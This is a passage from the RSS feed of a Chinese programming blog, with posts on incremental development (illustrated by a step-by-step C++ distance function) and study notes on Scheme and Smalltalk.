&lt;p&gt;在增量开发中，你首先设计系统可以运行的最简单版本。它甚至不接受任何数据输入，或者对数据进行处理，他也可以不产生输出。只需要成为一个坚实的骨架结构。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Fred Brooks(《人月神话》作者)甚至认为&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;应做好建造一个扔掉一个的准备&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id="3"&gt;3&lt;/h2&gt;
&lt;p&gt;开源社区其实一直挺习惯这种做法的&lt;/p&gt;
&lt;p&gt;《大教堂与集市》中提到&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;优秀的程序员知道写什么，卓越的程序员知道改写（和重用）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;"建设性懒惰”，他们知道人们要的是结果而不是勤奋，而从一个部分可行的方案开始，明显要比从零开始容易得多&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;虽然Linux中所有Minix代码最终都被移除或重写，但它在Linux成长初期确实起到了类似脚手架的作用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上是我做的读书摘记。&lt;/p&gt;
&lt;p&gt;你看，以上谈论的几点，如果你平时都混迹github的话，也许就是这样做的，当有某个需求时，用关键字去github搜下是否有类似项目，有的话，clone下来，以其为脚手架，先跑起来，在此基础上增量地做些自己的定制，如果跑不起来，就checkout回去，成功的话，又继续往前多迈一步，因为使用的是增量式开发，你能知道每次的错误肯定是新增的代码造成的，这样一来你是信心十足的前进，毫无后顾之忧&lt;/p&gt;
&lt;h2 id="4"&gt;4&lt;/h2&gt;
&lt;p&gt;晚上在翻《How to Think Like a Computer Scientist: C++ version》 （中文版《像计算机科学家一样思考 C++版》）&lt;/p&gt;
&lt;p&gt;第5章谈到程序开发时，作者建议大家使用增量式开发。书中举得一个例子很棒，摘录过来，适合帮助新手理解增量式开发的过程&lt;/p&gt;
&lt;p&gt;我们面临这样一个任务：计算两点（x1,y1）和（x2,y2）之间的距离&lt;/p&gt;
&lt;p&gt;公式是简单的：distance = √((x2-x1)^2+(y2-y1)^2)&lt;/p&gt;
&lt;h3 id="41"&gt;4.1&lt;/h3&gt;
&lt;p&gt;好的，我们开始写下骨架代码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在这一阶段函数并没有做任何实质性的事情，但是尝试编译可以让我们在把函数变得更复杂之前确认是否却在语法错误。&lt;/p&gt;
&lt;h3 id="42"&gt;4.2&lt;/h3&gt;
&lt;p&gt;为了测试这个新函数，我们需要调用它&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dist&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;6.0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;dict&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;一旦检查完函数定义的语法，就可以开始一次添加一行的代码进行增量开发了。在每次增量改变之后，就可以编译运行程序，用这种方法，在任何一个时间点我们都确切知道错误所在--刚添加的最后一行代码。&lt;/p&gt;
&lt;h3 id="43"&gt;4.3&lt;/h3&gt;
&lt;p&gt;编译，运行，一切正常。这时你的信心在不断累积。下一步是用两个临时变量dx和dy存储x2-x1和y2-y1的差值&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;dx is &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;dy is &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在此计算distance(1.0, 2.0, 4.0, 6.0)。其中参数的选择是有原因的，水平距离为3，垂直距离为4，所以两点间距离为5，当测试一个函数的时候，知道正确的结果是很有帮助的。在这里dx为3.0，dy为4.0&lt;/p&gt;
&lt;p&gt;编写完函数时，会删除输出语句，像这样的代码称为&lt;code&gt;支架代码&lt;/code&gt;，可以帮助正确地编写程序，但是它并不是最终代码的一部分。&lt;/p&gt;
&lt;h3 id="44"&gt;4.4&lt;/h3&gt;
&lt;p&gt;下一步是对dx和dy做平方计算，我们使用简单快捷的直接与自身相乘。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dsquared&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;dsquared is &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;dsquared&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在这个阶段可以再一次编译和运行程序，检查中间值是否正确&lt;/p&gt;
&lt;h3 id="45"&gt;4.5&lt;/h3&gt;
&lt;p&gt;最后，用sqrt函数计算平方根，并返回结果&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dsquared&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqrt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dsquared&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;至此，主要的工作就完成了。&lt;/p&gt;
&lt;h3 id="46"&gt;4.6&lt;/h3&gt;
&lt;p&gt;在main函数中，检查结果&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;math.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dsquared&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqrt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dsquared&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dist&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;6.0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;dict&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;熟练之后，一次可以编写和调试更多的行。&lt;/p&gt;
&lt;p&gt;总结下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从一个可以运行的程序开始，做小步，渐进的改进。在任何一点，如果出错，可以清楚地知道错误发生的地方&lt;/li&gt;
&lt;li&gt;使用临时变量存储中间结果，便于输出和检查。&lt;/li&gt;
&lt;li&gt;一旦程序正常运行，可能需要移除部分支架代码。记得加上注释使程序保持可读性。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此外可以结合git来管理代码，将没有问题的代码入库，保证代码安全的同时，可以随时切换到任意时间点。这样在渐进前进的同时就可以无所顾忌了&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 04 Jun 2015 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2015-06-04:about-incremental-development.html</guid><category>code</category></item><item><title>Scheme学习笔记</title><link>/learn-Scheme.html</link><description>&lt;p&gt;大学时读了不少函数式的资料，十分喜欢函数式的风格。&lt;br /&gt;
前段时间比较认真地学了一下Scheme。&lt;br /&gt;
尽管我们在实际项目中很少会用到Scheme，但学习Scheme有助于写出更高质量函数。就像学习Smalltalk有助于理解对象。&lt;br /&gt;
Scheme和Smalltalk是我见过最纯粹优美的两门语言。&lt;br /&gt;
说说学习Scheme中的一些心得体会：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;表达你的意图，而不是操作过程，这样有助于我们能站在更高的抽象层面上&lt;/li&gt;
&lt;li&gt;尽量不要副作用，函数主要目的是返回(return)一个值。这样可以保证函树能更容易被当作黑箱，就是说有更好的抽象性&lt;/li&gt;
&lt;li&gt;for-loops表达的是过程，map,reduce,filter(sorted,groupby)隐含循环，语义上却在表达意图&lt;/li&gt;
&lt;li&gt;表达出你的意图能提高代码可读性&lt;/li&gt;
&lt;li&gt;在自己的定义中调用自己的函数叫做递归函数. &lt;/li&gt;
&lt;li&gt;现实中很多任务是递归的，重复某个动作，符合条件退出。这是普适性很强的抽象模型&lt;/li&gt;
&lt;li&gt;以下内容有助于你理解递归：你可能需要去阅读你正在阅读的文献所引用的文献。进一步，你可能还需要去阅读文件所引用的其它文献。这样，文献调研就是一个递归的过程，你也可以重复这个调研过程直到满足了特定条件&lt;/li&gt;
&lt;li&gt;递归耗内存的原因是开销大的原因在于过程没有被计算。一直存在内存中。尾递归的本质是用某个内存空间来收集计算的结果，而不必一直存在内存中&lt;/li&gt;
&lt;li&gt;cons 负责把每个结果串起来。大脑的内存不很大，我们能应付的复杂度很有限。所以每次不要走太远，每次只处理当前一步，思考后续一致，用递归的方式思考。  使用抽象来描述，不要把所有过程加载到大脑&lt;/li&gt;
&lt;li&gt;命名递归变量很重要，表达出意图&lt;/li&gt;
&lt;li&gt;lambda表达式的参数仅在函数定义内部有效。let只是lambda的语法糖，因此二者无异。对于语义的表达有帮助的话，语法糖就是良好的&lt;/li&gt;
&lt;li&gt;lambda表达式用于定义函数，它为变量建立了一个作用域，变量的作用域被限定在了源码中定义其的那个括号里&lt;/li&gt;
&lt;li&gt;闭包能记住内部状态，因此可以用来模拟对象&lt;/li&gt;
&lt;li&gt;赋值改变了参数的值，具有破坏性，当万不得已时才使用赋值&lt;/li&gt;
&lt;li&gt;Scheme并没有定义块结构的语法，因此使用lambda表达式作为一个块&lt;/li&gt;
&lt;li&gt;高阶函数是一种以函数为参数的函数。它们都被用于映射（mapping）、过滤（filtering）、归档（folding）和排序（sorting）表。高阶函数提高了程序的模块性。使用一个高阶函数来实现排序可以使得我们使用不同的条件来排序，这就将排序条件和排序过程清楚地划分开来。很容易写函数来实现插拔。&lt;/li&gt;
&lt;li&gt;Scheme中代码即数据，因此你可以通过将函数当作参数传递轻松的定义自己的高阶函数。&lt;/li&gt;
&lt;li&gt;你可以通过“程序”来写程序&lt;/li&gt;
&lt;li&gt;lisp中所有东西都是数据  代码也是 虚虚实实 惰性求值变得容易 。&lt;/li&gt;
&lt;li&gt;字符是个比较关键的概念，代码本身只是文本而已。Lisp语言的最初目的就是符号处理，在Scheme语言中几乎所有的东西都可以看做是符号或做为符号列表来处理&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="_1"&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://deathking.github.io/yast-cn/"&gt;Scheme入门教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/heros/archive/2009/11/30/1614111.html"&gt;Scheme简明教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ibm.com/search/csass/search/?q=Scheme&amp;amp;sn=dw&amp;amp;lang=zh&amp;amp;cc=CN&amp;amp;en=utf&amp;amp;hpp=20&amp;amp;dws=cndw&amp;amp;lo=zh"&gt;ibm&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 03 Sep 2014 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2014-09-03:learn-Scheme.html</guid></item><item><title>Smalltalk学习笔记</title><link>/learn-Smalltalk.html</link><description>&lt;ul&gt;
&lt;li&gt;所有一切都是物体（Everything is an Object）。这是Smalltalk中最重要的一条规则。&lt;/li&gt;
&lt;li&gt;一个变量没有与之关联的类型。变量仅仅指向物体&lt;/li&gt;
&lt;li&gt;a := 2的真正含义不是“将a的值设置为整数2”，而是“让变量a指向一个值为2的SmallInteger(小整数)物体”&lt;/li&gt;
&lt;li&gt;所有的计算都通过消息（message）来触发。你向某个物体发送消息，然后就会发生某些事情。&lt;/li&gt;
&lt;li&gt;(15 * 19) + (37 squared)可以理解为：向15发送消息 * ，参数为19；向37发送消息squared；最后向15*19的结果发送消息 + ，参数为37 squared的结果。&lt;/li&gt;
&lt;li&gt;Smalltalk中所有的表达式都是&amp;lt;接受消息的物体&amp;gt; &amp;lt;消息&amp;gt;&lt;/li&gt;
&lt;li&gt;消息激发方法。一个消息会对应什么方法是由接受消息的物体决定的。&lt;/li&gt;
&lt;li&gt;每条消息（to: do:, whileTrue:, +）都会激发方法，这些方法是Smalltalk中的代码单元，你可以认为方法就是你常用的编程语言中的函数或者过程。方法是计算发生的地方。。你不仅可以查看它们的控制结构和操作是如何实现的——而且还能改动它们！&lt;/li&gt;
&lt;li&gt;每一个物体都是某类事物的一个实例。&lt;/li&gt;
&lt;li&gt;由于该类（事物）中定义了此实例（物体）的行为，所以必须找到这个接受消息的物体所属于的类，然后通过类来指出应该如何解释收到的消息。这一点非常重要。  (代码的位置，高层和底层视角的切换 很微妙)&lt;/li&gt;
&lt;li&gt;类是定义方法（行为）的地方，决定了物体是否有某种能力（能执行某个动作），所有代码都能在类中找到,没有魔术&lt;/li&gt;
&lt;li&gt;Smalltalk中没有什么要记住的关键字（甚至没有if，你可以自己实现）！使用Smalltalk，就像用小积木，能让你搭建出你想要的任何东西。&lt;/li&gt;
&lt;li&gt;在Smalltalk语言中没有条件语句，取而代之的是一些发送给对象true或者false的消息，因此它们不属于语言部分，而属于Smalltalk的类库；也没有循环重复语句（C语言中的for, while），Smalltalk用向数字对象或块对象发送消息来实现重复执行。&lt;/li&gt;
&lt;li&gt;语言没有固定的语法，语法分析由类本身完成&lt;/li&gt;
&lt;li&gt;Smalltalk是一种使用“晚绑定（late-binding”的语言，让相同的消息在不同的数据上执行近似的功能成为多态。当你看到一个printString消息时，你实际上并不知道将会执行什么，直到你了解这个消息被发送给哪个物体后，才能清楚到底会执行什么内容&lt;/li&gt;
&lt;li&gt;从smalltalk这里学习对象，从lisp那里学习函数&lt;/li&gt;
&lt;li&gt;面向对象编程的精髓在于将行为绑定在数据上&lt;/li&gt;
&lt;li&gt;在结构化程序设计之中，我们将精力集中在行为（动词）上，然后弄清楚我们需要哪些数据（名词）才能执行。总而言之，我们将数据绑定在行为上。但在面向对象程序设计之中，我们将程序的中心用名词和数据表示，然后弄清楚我们要将哪些行为绑定在他们之上&lt;/li&gt;
&lt;li&gt;Smalltalk和Scheme都非常优美纯粹，一致性非常好，相比之下，主流工业语言有些大杂烩，不少由于妥协导致的不一致，以及难以理解&lt;/li&gt;
&lt;li&gt;严格遵照一个唯一标准机制的做法已经被证明具有惊人的威力&lt;/li&gt;
&lt;li&gt;学习纯粹的语言，能让你更容易搞懂核心概念，而不会被各种枝节分神，而这些概念是大多编程语言的核心&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="_1"&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://zh.wikipedia.org/wiki/Smalltalk"&gt;Smalltalk wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://developer.51cto.com/art/201109/291681.htm"&gt;Smalltalk为什么让我爱不释手&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.sina.com.cn/s/blog_7d553bb501013w7d.html"&gt;Smalltalk的基本规则&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 03 Sep 2014 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2014-09-03:learn-Smalltalk.html</guid></item></channel></rss>